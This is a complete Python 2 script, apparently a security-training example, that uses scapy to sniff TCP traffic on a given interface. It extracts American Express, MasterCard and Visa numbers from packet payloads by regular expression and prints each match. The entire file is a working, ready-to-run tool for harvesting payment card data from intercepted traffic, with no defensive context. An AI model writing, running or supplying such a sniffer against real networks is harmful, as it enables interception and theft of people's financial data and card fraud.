#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import optparse
from scapy.all import *


def findCreditCard(pkt):
    raw = pkt.sprintf('%Raw.load%')
    americaRE = re.findall('3[47][0-9]{13}', raw)
    masterRE = re.findall('5[1-5][0-9]{14}', raw)
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)

    if americaRE:
        print '[+] Found American Express Card: ' + americaRE[0]
    if masterRE:
        print '[+] Found MasterCard Card: ' + masterRE[0]
    if visaRE:
        print '[+] Found Visa Card: ' + visaRE[0]


def main():
    parser = optparse.OptionParser('usage %prog -i <interface>')
    parser.add_option('-i', dest='interface', type='string',\
      help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface

    try:
        print '[*] Starting Credit Card Sniffer.'
        sniff(filter='tcp', prn=findCreditCard, store=0)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()
